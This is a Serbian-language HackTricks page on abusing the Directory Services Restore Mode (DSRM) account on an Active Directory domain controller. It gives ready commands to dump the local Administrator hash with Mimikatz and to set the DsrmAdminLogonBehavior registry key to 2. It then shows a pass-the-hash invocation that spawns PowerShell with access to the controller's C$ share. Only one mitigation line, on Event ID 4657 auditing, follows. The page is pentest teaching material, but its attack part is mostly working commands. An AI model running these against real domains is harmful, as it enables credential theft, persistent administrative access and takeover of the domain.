{{#include ../../banners/hacktricks-training.md}}

# DSRM Kredencijali

Postoji **lokalni administrator** nalog unutar svakog **DC**. Imajući administratorske privilegije na ovoj mašini, možete koristiti mimikatz da **izvučete hash lokalnog Administratora**. Zatim, modifikovanjem registra da **aktivirate ovu lozinku** kako biste mogli daljinski pristupiti ovom lokalnom Administrator korisniku.\
Prvo treba da **izvučemo** **hash** korisnika **lokalnog Administratora** unutar DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Zatim treba da proverimo da li taj nalog funkcioniše, i ako registracioni ključ ima vrednost "0" ili ne postoji, treba da **postavite na "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Zatim, koristeći PTH možete **navesti sadržaj C$ ili čak dobiti shell**. Imajte na umu da je za kreiranje nove powershell sesije sa tim hash-om u memoriji (za PTH) **"domen" koji se koristi samo ime DC mašine:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Više informacija o ovome na: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) i [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Ublažavanje

- Event ID 4657 - Audit kreiranja/promene `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
